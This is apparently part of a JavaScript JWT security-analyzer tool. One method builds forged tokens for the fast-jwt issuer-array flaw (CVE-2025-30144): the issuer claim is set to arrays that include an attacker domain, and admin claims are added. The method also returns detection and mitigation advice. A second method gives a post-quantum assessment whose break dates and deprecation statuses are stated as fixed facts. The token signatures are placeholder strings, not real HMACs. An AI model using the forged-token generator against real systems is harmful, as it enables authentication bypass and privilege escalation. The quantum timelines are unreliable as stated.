        const legitimateIssuer = decoded.payload.iss || 'https://legitimate-issuer.com';
        const attackerIssuer = 'https://attacker-controlled-domain.com';
        
        
        const maliciousPayload = {
            ...decoded.payload,
            iss: [attackerIssuer, legitimateIssuer], 
            sub: 'admin',
            role: 'administrator',
            permissions: ['all'],
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + 3600,
            aud: decoded.payload.aud || 'vulnerable-application'
        };

        
        const attackVariants = [
            {
                name: 'Array injection primary',
                payload: { ...maliciousPayload, iss: [attackerIssuer, legitimateIssuer] }
            },
            {
                name: 'Array injection secondary',
                payload: { ...maliciousPayload, iss: [legitimateIssuer, attackerIssuer] }
            },
            {
                name: 'Mixed type confusion',
                payload: { ...maliciousPayload, iss: attackerIssuer, 'iss[]': [legitimateIssuer] }
            },
            {
                name: 'Nested array bypass',
                payload: { ...maliciousPayload, iss: [[attackerIssuer], legitimateIssuer] }
            }
        ];

        const tokens = [];
        for (const variant of attackVariants) {
            const header = { ...decoded.header, typ: 'JWT', alg: 'HS256' };
            const headerB64 = this.base64UrlEncode(JSON.stringify(header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(variant.payload));
            
            
            const data = headerB64 + '.' + payloadB64;
            const signature = this.base64UrlEncode(`bypass_signature_${data.length}`);
            
            tokens.push({
                variant: variant.name,
                token: `${headerB64}.${payloadB64}.${signature}`,
                payload: variant.payload
            });
        }

        return {
            description: attackDescription,
            token: tokens[0].token,
            impact: 'High - Allows authentication bypass and privilege escalation through issuer validation bypass',
            usage: 'Test against applications using fast-jwt library < 5.0.6. Focus on array-based issuer claims',
            cve: 'CVE-2025-30144',
            affected_versions: 'fast-jwt < 5.0.6',
            attack_variants: tokens,
            technical_details: {
                root_cause: 'Fast-jwt library incorrectly accepts arrays as issuer values, violating RFC 7519',
                exploitation: 'Attacker includes both legitimate and malicious issuers in iss array',
                bypass_mechanism: 'Library validates array permissively, allowing attacker domain inclusion'
            },
            detection: 'Monitor for JWT tokens with array-type issuer claims and multiple issuer values',
            mitigation: 'Upgrade fast-jwt to version 5.0.6 or later, implement strict string-only issuer validation'
        };
    }

    /**
     * Generates post-quantum cryptography vulnerability assessment
     * Evaluates JWT algorithms against NIST 2025 post-quantum standards
     * @method
     * @param {Object} decoded - Decoded JWT token object with header and payload
     * @returns {Object} Assessment with quantum vulnerability analysis and migration timeline
     */
    generatePostQuantumAssessment(decoded) {
        
        const attackDescription = 'Post-Quantum Cryptography Vulnerability Assessment - 2025 NIST Standards';
        
        
        const quantumVulnerableAlgs = {
            'RS256': { type: 'RSA', keySize: 2048, timeToBreak: '2030-2035', nistStatus: 'deprecated' },
            'RS384': { type: 'RSA', keySize: 2048, timeToBreak: '2030-2035', nistStatus: 'deprecated' },
            'RS512': { type: 'RSA', keySize: 4096, timeToBreak: '2030-2035', nistStatus: 'deprecated' },
            'ES256': { type: 'ECDSA', curve: 'P-256', timeToBreak: '2028-2032', nistStatus: 'deprecated' },
            'ES384': { type: 'ECDSA', curve: 'P-384', timeToBreak: '2030-2035', nistStatus: 'deprecated' },
            'ES512': { type: 'ECDSA', curve: 'P-521', timeToBreak: '2030-2035', nistStatus: 'deprecated' }
        };
        
        const quantumResistantAlgs = {
            'HS256': { type: 'HMAC', keySize: 256, quantumResistant: true, nistStatus: 'approved' },
            'HS384': { type: 'HMAC', keySize: 384, quantumResistant: true, nistStatus: 'approved' },
            'HS512': { type: 'HMAC', keySize: 512, quantumResistant: true, nistStatus: 'approved' }
        };

        
        const pqcRecommendations = {
            signatures: ['ML-DSA (CRYSTALS-Dilithium)', 'SLH-DSA (SPHINCS+)'],
            keyExchange: ['ML-KEM (CRYSTALS-KYBER)', 'HQC (Hamming Quasi-Cyclic)'],
            backup: ['HQC as ML-KEM backup (selected March 2025)']
        };

        const currentAlg = decoded.header.alg;
        let assessment = {};
        
        if (quantumVulnerableAlgs[currentAlg]) {
            const vulnInfo = quantumVulnerableAlgs[currentAlg];
            assessment = {
                status: 'VULNERABLE',
                risk_level: 'CRITICAL',
                algorithm: currentAlg,
                vulnerability_details: vulnInfo,
                time_to_breach: vulnInfo.timeToBreak,
                nist_status: vulnInfo.nistStatus,
                harvest_now_decrypt_later_risk: 'HIGH - Data encrypted today may be vulnerable within 10 years'
            };
        } else if (quantumResistantAlgs[currentAlg]) {
            const resistantInfo = quantumResistantAlgs[currentAlg];
            assessment = {
                status: 'QUANTUM_RESISTANT',
                risk_level: 'LOW',
                algorithm: currentAlg,
                details: resistantInfo,
                nist_status: resistantInfo.nistStatus,
                harvest_now_decrypt_later_risk: 'LOW - HMAC algorithms are quantum-resistant'
            };
        } else {
            assessment = {
                status: 'UNKNOWN',
                risk_level: 'MEDIUM',
                algorithm: currentAlg,
                recommendation: 'Algorithm not recognized - manual assessment required'
            };
        }

        
        const migrationTimeline = {
            '2025': 'Discovery phase - inventory quantum-vulnerable systems',
            '2028': 'High-priority system migration deadline',
            '2030': 'NIST deprecation of 112-bit security algorithms',
            '2031': 'UK government mandate for high-priority migrations',
            '2035': 'Full transition to post-quantum cryptography required'
        };

        return {
            description: attackDescription,
            token: 'Assessment only - no attack token generated',
            impact: assessment.risk_level === 'CRITICAL' ? 
                'Current JWT signatures will be breakable by quantum computers within 10-15 years' : 
                'JWT signatures are quantum-resistant',
            usage: 'Use for post-quantum migration planning and compliance assessment',
            assessment: assessment,
            nist_standards_2025: {
                finalized_algorithms: pqcRecommendations,
                standards_published: 'FIPS 203, 204, 205 (August 2024)',
                backup_algorithm: 'HQC selected as ML-KEM backup (March 2025)'
            },
            migration_timeline: migrationTimeline,
            recommendations: assessment.status === 'VULNERABLE' ? [
                'Plan immediate migration to quantum-resistant algorithms',
                'Implement crypto-agility for future algorithm updates',
                'Consider HMAC-based JWT signatures for immediate protection',
                'Prepare for NIST post-quantum standards implementation',
                'Assess "harvest now, decrypt later" data exposure risk'
            ] : [
                'Current algorithm is quantum-resistant',
                'Monitor NIST post-quantum standards for updates',
                'Maintain crypto-agility for future transitions'
            ],
            compliance: {
                nist_compliance: assessment.nist_status,
                government_mandates: 'US federal agencies must transition by 2035',
                enterprise_timeline: 'Most enterprises should complete migration by 2031'
            }
        };
    }
}

const app = new JWTSecurityAnalyzer();
window.app = app;